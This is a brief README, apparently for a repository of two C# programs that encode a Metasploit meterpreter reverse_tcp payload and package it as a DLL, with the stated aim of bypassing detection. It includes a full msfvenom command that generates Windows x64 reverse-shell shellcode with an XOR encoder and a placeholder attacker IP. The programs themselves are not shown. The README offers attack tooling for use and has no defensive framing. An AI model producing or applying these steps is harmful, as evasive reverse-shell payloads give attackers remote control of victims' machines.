# RS_meterpreter_bypass
These two C# programs are used to encode and create a .dll file from a starting metasploit encoded reverse_tcp payload.

# How to use
Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic

<msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f csharp -e x64/xor_dynamic>
